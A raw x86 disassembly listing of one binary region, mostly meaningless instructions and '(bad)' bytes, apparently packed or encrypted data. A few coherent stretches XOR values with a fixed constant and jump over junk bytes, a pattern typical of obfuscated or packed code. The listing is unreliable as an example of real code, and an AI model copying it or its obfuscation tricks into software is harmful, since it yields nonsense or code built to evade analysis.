  414ff2:	inc    edi
  414ff3:	aad    0xac
  414ff5:	inc    ecx
  414ff6:	mov    ebx,0xb6eb830a
  414ffb:	dec    ebx
  414ffc:	adc    ah,BYTE PTR [ebp+0x8]
  414fff:	inc    esp
  415000:	and    al,0x11
  415002:	and    al,0x84
  415004:	mov    cl,0xc4
  415006:	jle    0x414ff6
  415008:	mov    edi,0x8f7d05dd
  41500d:	sahf   
  41500e:	scas   eax,DWORD PTR es:[edi]
  41500f:	jnp    0x414fbc
  415011:	push   DWORD PTR [ecx-0x659281e0]
  415017:	lock mov ecx,0x88a3531c
  41501d:	test   BYTE PTR [esi+0x3408ce88],0x8c
  415024:	imul   eax,DWORD PTR [eax],0x12
  415027:	clc    
  415028:	sub    BYTE PTR [esi+0x9cecf54],ah
  41502e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41502f:	sar    DWORD PTR [esi],cl
  415031:	mov    eax,ds:0x26d60b2d
  415036:	push   ebp
  415037:	push   es
  415038:	aaa    
  415039:	aaa    
  41503a:	pop    ds
  41503b:	push   edi
  41503c:	aam    0x2e
  41503e:	stos   DWORD PTR es:[edi],eax
  41503f:	icebp  
  415040:	dec    DWORD PTR [ebx]
  415042:	aam    0x47
  415044:	mov    esi,0xfe5a193c
  415049:	leave  
  41504a:	adc    ah,dh
  41504c:	push   ds
  41504d:	sub    bh,BYTE PTR [esi-0x157868e]
  415053:	adc    al,0x3d
  415055:	das    
  415056:	nop
  415057:	xor    DWORD PTR [ebx],0x2a
  41505a:	sahf   
  41505b:	xor    al,0xe1
  41505d:	sub    BYTE PTR [esi],cl
  41505f:	adc    BYTE PTR [ecx+0x54],bl
  415062:	icebp  
  415063:	outs   dx,DWORD PTR ds:[esi]
  415064:	push   es
  415065:	ret    
  415066:	mov    al,ds:0x2b5a3fa
  41506b:	or     eax,0xccd39376
  415070:	out    dx,al
  415071:	dec    ecx
  415072:	sub    eax,0x21ea4f0a
  415077:	jae    0x4150b4
  415079:	gs dec edi
  41507b:	cmp    edx,DWORD PTR ds:0xd7d979d2
  415081:	add    DWORD PTR [eax-0x14],0x5c6ccd6e
  415088:	sar    dl,1
  41508a:	mov    eax,ds:0xf6a5eb02
  41508f:	sub    al,0x90
  415091:	js     0x4150a5
  415093:	mov    dl,0x12
  415095:	sub    BYTE PTR [edi+eiz*2+0x52],dl
  415099:	cmp    ebp,DWORD PTR [edi+0x61]
  41509c:	dec    edx
  41509d:	int3   
  41509e:	fcom   QWORD PTR [eax+0x11902f92]
  4150a4:	dec    eax
  4150a5:	mov    BYTE PTR [ebx+0x22ee26c1],bh
  4150ab:	(bad)  
  4150ac:	aaa    
  4150ad:	cmp    DWORD PTR [edx+0x1d040caf],ecx
  4150b3:	rsm    
  4150b5:	adc    ecx,0x4c
  4150b8:	xchg   dx,ax
  4150ba:	in     eax,dx
  4150bb:	pop    esi
  4150bc:	pop    edx
  4150bd:	pushf  
  4150be:	jb     0x415075
  4150c0:	fdiv   QWORD PTR [edi+0x5245e9b9]
  4150c6:	inc    ecx
  4150c7:	xor    al,0x56
  4150c9:	sbb    DWORD PTR [eax+0x53],edx
  4150cc:	sbb    DWORD PTR [ecx],esp
  4150ce:	popa   
  4150cf:	rol    dh,cl
  4150d1:	push   ds
  4150d2:	mov    ecx,0xf126df7e
  4150d7:	test   eax,0x18ddf73b
  4150dc:	xchg   BYTE PTR [ebp-0x63],cl
  4150df:	mov    al,0x31
  4150e1:	push   ss
  4150e2:	fsub   st,st(2)
  4150e4:	mov    eax,0xc71bafba
  4150e9:	call   0xf9a4:0x21e8a9d7
  4150f0:	fcmovnu st,st(6)
  4150f2:	or     eax,0x3e49687f
  4150f7:	adc    cl,ch
  4150f9:	nop
  4150fa:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4150fc:	dec    esp
  4150fd:	mov    ebp,0x365fc1a5
  415102:	call   0x6771:0xf54587e5
  415109:	dec    esi
  41510a:	or     BYTE PTR [ebp-0x29],dh
  41510d:	(bad)  
  41510e:	cmp    edx,DWORD PTR ds:0xb6c076c5
  415114:	cmp    BYTE PTR [edx],ah
  415116:	sbb    eax,0x5157b7b9
  41511b:	cmp    bl,BYTE PTR [ebx]
  41511d:	sti    
  41511e:	xchg   edi,esi
  415120:	int    0x8f
  415122:	fwait
  415123:	inc    eax
  415124:	adc    DWORD PTR [edi],eax
  415126:	sbb    ebx,edi
  415128:	dec    ebx
  415129:	add    BYTE PTR ds:0xb43c7e1e,0x93
  415130:	xchg   ebp,eax
  415131:	out    0xff,al
  415133:	mov    ebx,0x40ebed35
  415138:	jl     0x41511f
  41513a:	repnz imul edi,DWORD PTR [edi],0x67631148
  415141:	(bad)  
  415142:	popa   
  415143:	and    al,0xfc
  415145:	inc    ebx
  415146:	lahf   
  415147:	mov    al,0x45
  415149:	lock push es
  41514b:	inc    edx
  41514c:	lahf   
  41514d:	mov    esp,0x31a5afd7
  415152:	or     BYTE PTR [ebx-0x35b5789b],0x67
  415159:	mov    ch,BYTE PTR ds:0x929abccf
  41515f:	push   ebp
  415160:	add    al,0x97
  415162:	call   0xe5fe:0xb19b323b
  415169:	fldenv [edi]
  41516b:	lds    ebx,FWORD PTR [edi]
  41516d:	mov    ds:0x1f07f2e6,eax
  415172:	test   eax,0xef2b63df
  415177:	xchg   BYTE PTR [ecx-0x641cc25f],cl
  41517d:	mov    dl,0x76
  41517f:	sub    esp,eax
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fldenv [ecx-0x120c311b]
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	in     al,dx
  4151b1:	rol    ecx,cl
  4151b3:	lea    eax,[edi]
  4151b5:	clc    
  4151b6:	in     al,dx
  4151b7:	iret   
  4151b8:	test   BYTE PTR ds:0xd1a3212,dl
  4151be:	xor    bl,ah
  4151c0:	mov    ah,BYTE PTR [ebx-0x347bcb10]
  4151c6:	loop   0x41523a
  4151c8:	sub    al,0x9d
  4151ca:	sbb    BYTE PTR [esi],al
  4151cc:	pop    eax
  4151cd:	pop    ecx
  4151ce:	add    ebx,edi
  4151d0:	(bad)  [edi+0x58caf5c0]
  4151d6:	xor    cl,dh
  4151d8:	xchg   ebp,eax
  4151d9:	fisttp DWORD PTR [esi]
  4151db:	aas    
  4151dc:	stos   BYTE PTR es:[edi],al
  4151dd:	mov    dh,0x47
  4151df:	cmp    al,0x6c
  4151e1:	bound  esp,QWORD PTR [esi-0x4729eb16]
  4151e7:	and    DWORD PTR [edi+0x467547ef],0x2
  4151ee:	fistp  DWORD PTR [ecx-0x2e88fc87]
  4151f4:	inc    ecx
  4151f5:	add    al,0x9f
  4151f7:	inc    esi
  4151f8:	add    BYTE PTR [edx],dl
  4151fa:	sti    
  4151fb:	cmp    DWORD PTR [ebp-0x34db3932],eax
  415201:	pusha  
  415202:	jne    0x415224
  415204:	push   0x4a
  415206:	xchg   edi,eax
  415207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415208:	mov    BYTE PTR [ebx-0x75],dl
  41520b:	sbb    DWORD PTR [eax],esp
  41520d:	lea    ebx,[ebx-0x3c345d07]
  415213:	lahf   
  415214:	neg    DWORD PTR [eax+0x44]
  415217:	mov    ebp,0x90e53bfa
  41521c:	mov    ebp,0xeca89267
  415221:	scas   al,BYTE PTR es:[edi]
  415222:	sub    edx,DWORD PTR [esi]
  415224:	sti    
  415225:	sbb    dh,cl
  415227:	sbb    al,0x15
  415229:	mov    dl,0xb
  41522b:	cdq    
  41522c:	pop    esi
  41522d:	and    BYTE PTR [edi],ah
  41522f:	int    0x17
  415231:	xchg   BYTE PTR [edx-0x27e8614a],dh
  415237:	pop    edi
  415238:	add    eax,0xdb87936b
  41523d:	inc    esi
  41523e:	cmp    BYTE PTR [edi-0xe],cl
  415241:	xlat   BYTE PTR ds:[ebx]
  415242:	fdivrp st(7),st
  415244:	mov    cs,ebx
  415246:	pushf  
  415247:	fs aaa 
  415249:	cdq    
  41524a:	cmp    DWORD PTR [ecx+0x54fccc14],edx
  415250:	out    dx,al
  415251:	shl    edi,0xe5
  415254:	dec    ecx
  415255:	cmp    cl,BYTE PTR [esi+eax*4-0x2848f985]
  41525c:	cmp    al,0x9d
  41525e:	lock int3 
  415260:	push   ebx
  415261:	aad    0xe5
  415263:	jl     0x41521c
  415265:	(bad)  
  415266:	sbb    eax,0x7e5a5087
  41526b:	cmp    DWORD PTR [esi+0x595313c3],edx
  415271:	pop    ebx
  415272:	es xchg esp,eax
  415274:	sub    dh,BYTE PTR [ebp-0x57041d94]
  41527a:	jecxz  0x415232
  41527c:	xchg   esi,eax
  41527d:	cmp    eax,0xf57a158d
  415282:	out    dx,eax
  415283:	pop    ds
  415284:	loope  0x41524b
  415286:	mov    edi,DWORD PTR [edi]
  415288:	loopne 0x415258
  41528a:	xor    al,0xe4
  41528c:	push   edi
  41528d:	jbe    0x4152c7
  41528f:	es pop ds
  415291:	sub    ch,BYTE PTR [ebx-0x1c]
  415294:	mov    WORD PTR [edx+ebp*1+0x43],es
  415298:	cli    
  415299:	push   ebx
  41529a:	stc    
  41529b:	inc    ecx
  41529c:	imul   ecx,DWORD PTR gs:[ebx],0xe7159ae
  4152a3:	xor    eax,DWORD PTR [edi-0x7]
  4152a6:	pusha  
  4152a7:	in     eax,dx
  4152a8:	add    DWORD PTR [edx],ecx
  4152aa:	es mov ecx,0x1ce528e6
  4152b0:	adc    edx,DWORD PTR [edi]
  4152b2:	jmp    0x5a1f9ddb
  4152b7:	adc    dl,0x6c
  4152ba:	push   ebx
  4152bb:	sub    eax,0x217d284
  4152c0:	jge    0x415242
  4152c2:	mov    BYTE PTR [edx-0x709a44a4],0xf2
  4152c9:	adc    bl,bl
  4152cb:	and    esp,DWORD PTR [ebx+0x65]
  4152ce:	push   esp
  4152cf:	fwait
  4152d0:	sub    eax,0xd5b3b85c
  4152d5:	shl    ecx,1
  4152d7:	out    0xa3,al
  4152d9:	mov    dh,0x12
  4152db:	int3   
  4152dc:	fsub   QWORD PTR [edi]
  4152de:	stos   BYTE PTR es:[edi],al
  4152df:	mov    ecx,0x5f0f6ad0
  4152e4:	out    0xe,eax
  4152e6:	enter  0xffcb,0x4b
  4152ea:	sub    al,0x40
  4152ec:	leave  
  4152ed:	test   BYTE PTR ds:0xd73846a0,0xcd
  4152f4:	(bad)  [ecx]
  4152f6:	in     al,0xe1
  4152f8:	js     0x415318
  4152fa:	mov    ebp,0x86df49c8
  4152ff:	ja     0x4152f3
  415301:	or     DWORD PTR [eax+0x416af70a],ebp
  415307:	inc    ecx
  415308:	(bad)  
  415309:	lfs    ecx,FWORD PTR [ebx-0x1]
  41530d:	lods   eax,DWORD PTR ds:[esi]
  41530e:	ins    DWORD PTR es:[edi],dx
  41530f:	jae    0x41536d
  415311:	mov    ds:0xd648155,eax
  415316:	push   edi
  415317:	or     dh,al
  415319:	or     ebx,DWORD PTR [edx-0x5b19897a]
  41531f:	mov    WORD PTR [ebx],ss
  415321:	outs   dx,DWORD PTR ds:[esi]
  415322:	sar    cl,cl
  415324:	adc    BYTE PTR [ebx+eax*8+0x7f00c80f],ch
  41532b:	jge    0x415389
  41532d:	push   eax
  41532e:	cmp    DWORD PTR [ebp-0x499d5179],ebx
  415334:	stos   BYTE PTR es:[edi],al
  415335:	add    ebx,ebx
  415337:	dec    esp
  415338:	add    dl,BYTE PTR [edx+0x68bc6d08]
  41533e:	ins    BYTE PTR es:[edi],dx
  41533f:	loop   0x41537f
  415341:	stc    
  415342:	mov    ch,0x14
  415344:	stos   BYTE PTR es:[edi],al
  415345:	mov    eax,0xe6f0c839
  41534a:	lock into 
  41534c:	dec    ebp
  41534d:	jg     0x4153bc
  41534f:	call   0xb797:0x6c613eb1
  415356:	cld    
  415357:	fidivr WORD PTR [ebx]
  415359:	and    eax,0x76c682a7
  41535e:	stc    
  41535f:	or     esp,eax
  415361:	jecxz  0x4153ad
  415363:	or     ah,BYTE PTR [ecx+0x2]
  415366:	xchg   esp,eax
  415367:	push   ds
  415368:	inc    ecx
  415369:	xchg   ecx,eax
  41536a:	add    ebp,DWORD PTR [ebx+0x78]
  41536d:	add    esi,ebp
  41536f:	cmp    edi,DWORD PTR [edx-0x28]
  415372:	shl    ah,1
  415374:	and    al,0x24
  415376:	dec    ebx
  415377:	lea    ebx,[edi-0x55]
  41537a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41537b:	or     BYTE PTR [ebp-0x2e],dl
  41537e:	sub    BYTE PTR [edx],bh
  415380:	cmp    DWORD PTR [ebx],edi
  415382:	gs and al,0x3e
  415385:	pop    ebp
  415386:	jl     0x4153fc
  415388:	xor    DWORD PTR [esi-0x23952afc],0x8
  41538f:	ja     0x415334
  415391:	sub    eax,0x4df9837e
  415396:	into   
  415397:	repnz out 0x2d,eax
  41539a:	and    DWORD PTR [eax],esi
  41539c:	sar    BYTE PTR [ebx+esi*2-0x2b6081b6],0xa1
  4153a4:	call   0xecb1:0x60a87acf
  4153ab:	addr16 addr16 mov bh,0xcf
  4153af:	in     al,dx
  4153b0:	push   0x74
  4153b2:	jne    0x4153b0
  4153b4:	imul   eax,edi,0xffffff84
  4153b7:	(bad)  
  4153b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153b9:	mov    edx,0xe7571349
  4153be:	jle    0x41542c
  4153c0:	mov    esi,DWORD PTR [eax+edi*8]
  4153c3:	pop    eax
  4153c4:	jle    0x4153b4
  4153c6:	pusha  
  4153c7:	ss dec eax
  4153c9:	aam    0x4c
  4153cb:	stos   BYTE PTR es:[edi],al
  4153cc:	into   
  4153cd:	pop    ss
  4153ce:	stos   BYTE PTR es:[edi],al
  4153cf:	adc    BYTE PTR [eax+0x6f8ee0c0],dl
  4153d5:	push   ebx
  4153d6:	ds hlt 
  4153d8:	out    0x84,al
  4153da:	sti    
  4153db:	sbb    DWORD PTR [edx],edx
  4153dd:	mov    cl,0x5e
  4153df:	icebp  
  4153e0:	ret    0x9cad
  4153e3:	sbb    al,0xd
  4153e5:	mov    bh,0x22
  4153e7:	mov    ah,0x9d
  4153e9:	(bad)  
  4153ea:	ja     0x41539d
  4153ec:	or     bh,dl
  4153ee:	imul   ebp,DWORD PTR [ebx],0x25
  4153f1:	sti    
  4153f2:	arpl   WORD PTR [edi+0x10],cx
  4153f5:	out    dx,al
  4153f6:	mov    bl,0x13
  4153f8:	repz jns 0x4153f6
  4153fb:	test   eax,0xd8f41260
  415400:	jl     0x415457
  415402:	adc    DWORD PTR [edx+0x3950a259],ebx
  415408:	pop    esi
  415409:	in     eax,dx
  41540a:	es push edi
  41540c:	shl    BYTE PTR [ecx-0x7b],1
  41540f:	ret    0xbcb1
  415412:	(bad)  
  415413:	test   eax,0x8a27c5fa
  415418:	call   0xf814685e
  41541d:	(bad)  
  41541e:	in     al,0x62
  415420:	mov    edi,0xcb904a3d
  415425:	or     esp,edi
  415427:	fidivr DWORD PTR [eax]
  415429:	in     eax,0xf7
  41542b:	aas    
  41542c:	inc    DWORD PTR [edx+0x1d]
  41542f:	pop    esp
  415430:	sbb    BYTE PTR [si-0x4277],ah
  415435:	mov    bh,0xa5
  415437:	fsubrp st(7),st
  415439:	pop    ebx
  41543a:	pop    es
  41543b:	xchg   esp,ebp
  41543d:	or     DWORD PTR [ebx+0x6bd159c2],eax
  415443:	pop    ds
  415444:	shl    BYTE PTR [esi+esi*1],cl
  415447:	imul   esi,DWORD PTR [esi],0x727ca0ad
  41544d:	jae    0x4153d5
  41544f:	jp     0x4153eb
  415451:	(bad)  
  415452:	ret    
  415453:	mov    bl,0x1e
  415455:	xlat   BYTE PTR ds:[ebx]
  415456:	mov    ch,0x5b
  415458:	pop    ds
  415459:	push   esi
  41545a:	les    esp,FWORD PTR [ebx+esi*2+0x5e]
  41545e:	out    dx,eax
  41545f:	adc    bl,BYTE PTR [eax]
  415461:	or     bl,0xca
  415464:	mov    eax,0x6906696c
  415469:	cmp    cl,BYTE PTR [edi]
  41546b:	repz sbb bh,cl
  41546e:	in     eax,0x69
  415470:	cli    
  415471:	inc    ebx
  415472:	push   0xb7e52632
  415477:	add    eax,edx
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0xf7
  4154c8:	add    eax,0x2366abd
  4154cd:	jg     0x41553f
  4154cf:	mov    ecx,0xe670707e
  4154d4:	call   0x5825f84b
  4154d9:	jp     0x415522
  4154db:	push   ebp
  4154dc:	dec    edx
  4154dd:	xor    eax,0xb839c9de
  4154e2:	rol    BYTE PTR [esi-0x5180b076],0x91
  4154e9:	je     0x4154ab
  4154eb:	jmp    0x5226175e
  4154f0:	jmp    0xf3af:0x5631ebe3
  4154f7:	call   0x1548de86
  4154fc:	mov    eax,ds:0xe62ae12b
  415501:	push   edx
  415502:	(bad)  [esi-0x1f176e44]
  415508:	or     BYTE PTR [esi+0x40],dl
  41550b:	fidivr WORD PTR [esi]
  41550d:	push   0x18
  41550f:	sub    al,0x86
  415511:	out    0x39,eax
  415513:	cmc    
  415514:	popf   
  415515:	fistp  QWORD PTR [ebp-0x72]
  415518:	mov    BYTE PTR [edx],dh
  41551a:	sbb    ebx,0x17
  41551d:	jo     0x415597
  41551f:	inc    ebx
  415520:	sbb    DWORD PTR [edi-0x32719a3a],eax
  415526:	jb     0x415503
  415528:	push   ss
  415529:	mov    bl,0x14
  41552b:	mov    ebp,DWORD PTR [edx+ebx*1]
  41552e:	jne    0x41550a
  415530:	mov    ebx,0x11be747f
  415535:	mov    al,0xf
  415537:	jl     0x41554c
  415539:	cmp    al,0x94
  41553b:	adc    cl,BYTE PTR [eax]
  41553d:	mov    edx,0x6c3bd659
  415542:	dec    edx
  415543:	adc    al,0x23
  415545:	fist   DWORD PTR [ebx-0x16374040]
  41554b:	dec    eax
  41554c:	push   edi
  41554d:	sbb    ebp,edx
  41554f:	push   ss
  415550:	popa   
  415551:	gs lock push ecx
  415554:	mov    edx,0xb72a31b2
  415559:	lahf   
  41555a:	not    DWORD PTR [ebx]
  41555c:	add    eax,0x6822e448
  415561:	adc    DWORD PTR [edx],ecx
  415563:	mov    dh,0x65
  415565:	ficomp DWORD PTR [eax-0x77]
  415568:	xchg   ebx,eax
  415569:	dec    edi
  41556a:	out    dx,eax
  41556b:	loopne 0x415549
  41556d:	mov    esi,esp
  41556f:	js     0x4154fc
  415571:	mov    edi,0xe15be021
  415576:	iret   
  415577:	mov    esi,DWORD PTR [edx]
  415579:	pushf  
  41557a:	jg     0x4155d5
  41557c:	sahf   
  41557d:	and    DWORD PTR [ecx+0x7e],eax
  415580:	into   
  415581:	cmp    al,0x14
  415583:	bound  ecx,QWORD PTR ds:0xe2671093
  415589:	pop    edx
  41558a:	inc    ecx
  41558b:	popa   
  41558c:	bound  edx,QWORD PTR [edi+0x5973f648]
  415592:	adc    eax,0xa29612cd
  415597:	inc    ebx
  415598:	stos   DWORD PTR es:[edi],eax
  415599:	mov    BYTE PTR [edx-0x5a174975],cl
  41559f:	sub    DWORD PTR [esi+0x7cc3e2e0],esp
  4155a5:	inc    ecx
  4155a6:	mov    dl,0xdc
  4155a8:	icebp  
  4155a9:	cld    
  4155aa:	cmovs  ebx,DWORD PTR [ebx]
  4155ad:	mov    BYTE PTR [edx],bl
  4155af:	push   ss
  4155b0:	lods   al,BYTE PTR ds:[esi]
  4155b1:	cmp    BYTE PTR [edi-0x297d2b97],al
  4155b7:	add    DWORD PTR [edx+0x3265c42a],esi
  4155bd:	repz (bad) 
  4155bf:	(bad)  
  4155c0:	dec    esp
  4155c1:	scas   al,BYTE PTR es:[edi]
  4155c2:	je     0x4155de
  4155c4:	sub    al,0x42
  4155c6:	push   ds
  4155c7:	adc    dl,0x9
  4155ca:	and    al,0xa8
  4155cc:	cli    
  4155cd:	sub    cl,al
  4155cf:	out    0x4,al
  4155d1:	aas    
  4155d2:	lock call 0x1d8:0x85e25d67
  4155da:	lds    ecx,FWORD PTR [edi+0x70]
  4155dd:	or     al,0xe7
  4155df:	pop    edx
  4155e0:	xor    ebp,DWORD PTR [ebx+0x64cfa62c]
  4155e6:	pop    ss
  4155e7:	pop    ds
  4155e8:	mov    BYTE PTR [edx-0x5d],cl
  4155eb:	stc    
  4155ec:	(bad)  
  4155ed:	fisttp WORD PTR [edi+0x73]
  4155f0:	aam    0x61
  4155f2:	jge    0x41561a
  4155f4:	data16 jo 0x41564b
  4155f7:	sbb    DWORD PTR [eax+0x39],eax
  4155fa:	stos   BYTE PTR es:[edi],al
  4155fb:	std    
  4155fc:	shl    DWORD PTR [esi+0x60],cl
  4155ff:	xchg   edx,eax
  415600:	pop    ss
  415601:	jl     0x415623
  415603:	out    0x6d,al
  415605:	xchg   ebx,eax
  415606:	stos   BYTE PTR es:[edi],al
  415607:	inc    edx
  415608:	sub    BYTE PTR [edi+0xd68bc82],0xa7
  41560f:	loop   0x415631
  415611:	push   esi
  415612:	lea    edx,[ebx-0x12]
  415615:	test   DWORD PTR [edi+0x399bb2fc],ebx
  41561b:	mov    ecx,0x3d87aea7
  415620:	mov    ah,0x17
  415622:	(bad)  
  415623:	repnz sahf 
  415625:	xlat   BYTE PTR ds:[ebx]
  415626:	stos   DWORD PTR es:[edi],eax
  415627:	call   0x11ee:0xf890c6ca
  41562e:	pop    ss
  41562f:	cmp    DWORD PTR [eax+edi*4-0x42],ebx
  415633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415634:	mov    ebp,0x502ff047
  415639:	jo     0x415671
  41563b:	scas   eax,DWORD PTR es:[edi]
  41563c:	stos   BYTE PTR es:[edi],al
  41563d:	rcr    BYTE PTR [ecx-0x3e803b32],cl
  415643:	scas   al,BYTE PTR es:[edi]
  415644:	sbb    eax,DWORD PTR [esi-0x4b3a26c9]
  41564a:	(bad)  
  41564b:	fldcw  WORD PTR [eax-0x7ec5437e]
  415651:	xchg   edx,eax
  415652:	rol    esp,cl
  415654:	dec    edi
  415655:	outs   dx,DWORD PTR ds:[esi]
  415656:	jmp    0xbf13:0x75701b18
  41565d:	mov    esi,0xb24f60a3
  415662:	add    DWORD PTR ds:0x3ccce370,edi
  415668:	fwait
  415669:	mov    bh,0x3a
  41566b:	in     eax,dx
  41566c:	add    al,0xff
  41566e:	aas    
  41566f:	aaa    
  415670:	xor    al,bl
  415672:	test   DWORD PTR [edx],esi
  415674:	jo     0x41567f
  415676:	jl     0x4156ec
  415678:	shl    DWORD PTR ss:[ebx],0xa1
  41567c:	std    
  41567d:	inc    ebp
  41567e:	hlt    
  41567f:	cmovge ebx,DWORD PTR [ebx-0x67d395e]
  415686:	xor    DWORD PTR [edi],0x49
  415689:	jne    0x415696
  41568b:	ret    
  41568c:	(bad)  
  41568d:	call   0x89a5:0xcff3a766
  415694:	or     eax,0xe75cc185
  415699:	dec    ebx
  41569a:	xor    dh,al
  41569c:	test   al,0x44
  41569e:	add    ebp,DWORD PTR [edx-0x66]
  4156a1:	fs nop
  4156a3:	mov    ah,BYTE PTR [eax]
  4156a5:	(bad)  
  4156a6:	ds sbb dl,ch
  4156a9:	data16 and dl,ah
  4156ac:	stc    
  4156ad:	dec    esi
  4156ae:	add    BYTE PTR [ebx-0xa5bc658],al
  4156b4:	sub    ch,BYTE PTR [eax]
  4156b6:	mov    ch,al
  4156b8:	arpl   WORD PTR [edi],sp
  4156ba:	push   0xf5e28a66
  4156bf:	js     0x415695
  4156c1:	or     BYTE PTR [esi+0x2b34e828],dh
  4156c7:	test   eax,0x3eae72ff
  4156cc:	or     eax,0x85fdabc3
  4156d1:	or     al,0xfb
  4156d3:	push   esp
  4156d4:	out    dx,al
  4156d5:	imul   esi,ecx,0xffffffb5
  4156d8:	mov    DWORD PTR [edi-0x74],ebx
  4156db:	mov    edi,0x77eb1bf3
  4156e0:	adc    cl,cl
  4156e2:	sbb    BYTE PTR [edx+0x37],ch
  4156e5:	jmp    0x4156e3
  4156e7:	int    0xf9
  4156e9:	sub    al,BYTE PTR fs:[ebp+0x14da9198]
  4156f0:	data16 cmc 
  4156f2:	sbb    esp,edi
  4156f4:	sbb    eax,0x2108fc6
  4156f9:	inc    ecx
  4156fa:	int    0x64
  4156fc:	in     al,0x4e
  4156fe:	mov    ?,WORD PTR [esi+0x3bf9ef20]
  415704:	push   ss
  415705:	fisttp QWORD PTR [eax]
  415707:	dec    edi
  415708:	inc    ebx
  415709:	dec    eax
  41570a:	fstp   QWORD PTR [ebx+0x6e7096de]
  415710:	xor    edi,edx
  415712:	sub    edx,edi
  415714:	add    DWORD PTR [eax-0x2c74c60a],ebp
  41571a:	arpl   WORD PTR [ebx],ax
  41571c:	test   DWORD PTR [eax-0x588f08ee],ebp
  415722:	push   edx
  415723:	call   0x19fa:0x926413c2
  41572a:	imul   BYTE PTR [eax]
  41572c:	mov    ah,0xac
  41572e:	fdiv   DWORD PTR [ecx]
  415730:	ds push edi
  415732:	loope  0x415711
  415734:	mov    edi,0x560bd69f
  415739:	dec    esi
  41573a:	fs es sub al,0xdd
  41573e:	push   eax
  41573f:	aad    0x38
  415741:	popf   
  415742:	mov    ?,WORD PTR [edi+0x12817cb]
  415748:	into   
  415749:	test   eax,0xffba2fa6
  41574e:	mov    edi,0x706b9377
  415753:	or     DWORD PTR [esi+0x775cb559],ebp
  415759:	mov    edx,0xa8d5dd3f
  41575e:	out    0x86,al
  415760:	cmp    eax,0x524ee74c
  415765:	(bad)  
  415766:	outs   dx,DWORD PTR ds:[esi]
  415767:	mov    esp,0xdcda3dff
  41576c:	imul   ecx,DWORD PTR [eax+0x53],0x41
  415770:	push   esi
  415771:	lods   al,BYTE PTR ds:[esi]
  415772:	jbe    0x415793
  415774:	inc    edx
  415775:	std    
  415776:	adc    esi,DWORD PTR [ebp+0x78ba4de5]
  41577c:	jmp    0x415776
  41577e:	fstp   QWORD PTR [ebx+ebx*8]
  415781:	dec    esp
  415782:	cmp    al,0x8b
  415784:	mov    edx,0xb0b390be
  415789:	in     al,0x36
  41578b:	stc    
  41578c:	dec    eax
  41578d:	(bad)  
  41578e:	xchg   esp,eax
  41578f:	shr    DWORD PTR [ecx-0x73],0xb6
  415793:	push   ebx
  415794:	out    dx,al
  415795:	loopne 0x415745
  415797:	hlt    
  415798:	test   BYTE PTR ds:[esi+0x32729c],bh
  41579f:	add    edi,esi
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR [ecx-0x1a],dh
  4157b9:	mov    edi,DWORD PTR [eax+0x707f0f7f]
  4157bf:	mov    ecx,0x5470707e
  4157c4:	xor    DWORD PTR [eax+0x74e13c03],eax
  4157ca:	ins    BYTE PTR es:[edi],dx
  4157cb:	xchg   ecx,eax
  4157cc:	sub    eax,0x46e83d2
  4157d1:	popa   
  4157d2:	xchg   ebx,eax
  4157d3:	adc    bh,BYTE PTR [eax+0x4e515074]
  4157d9:	xor    dl,BYTE PTR [ebp-0x1]
  4157dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157dd:	dec    esp
  4157de:	mov    ecx,0x861e4afd
  4157e3:	rol    DWORD PTR [edx+0x62],cl
  4157e6:	fadd   DWORD PTR [edx-0x26f94189]
  4157ec:	nop
  4157ed:	clc    
  4157ee:	into   
  4157ef:	sub    ch,BYTE PTR [edi-0x62]
  4157f2:	lods   eax,DWORD PTR ds:[esi]
  4157f3:	and    dl,dh
  4157f5:	fcom   QWORD PTR [eax]
  4157f7:	fsubr  QWORD PTR [ecx+esi*2+0x64a07cf]
  4157fe:	mov    bh,0xcd
  415800:	fidiv  WORD PTR [eax+0x38]
  415803:	push   edi
  415804:	enter  0xe6d7,0xa1
  415808:	and    DWORD PTR [eax-0x3b23aa83],edx
  41580e:	ss sbb eax,0x5b2f4a8f
  415814:	adc    BYTE PTR [ecx-0x4f5d891b],dl
  41581a:	(bad)  
  41581c:	sbb    eax,0x105e1758
  415821:	sar    BYTE PTR [ecx],0x88
  415824:	arpl   WORD PTR [eax+0x76],si
  415827:	cdq    
  415828:	inc    esi
  415829:	stos   DWORD PTR es:[edi],eax
  41582a:	dec    esi
  41582b:	sahf   
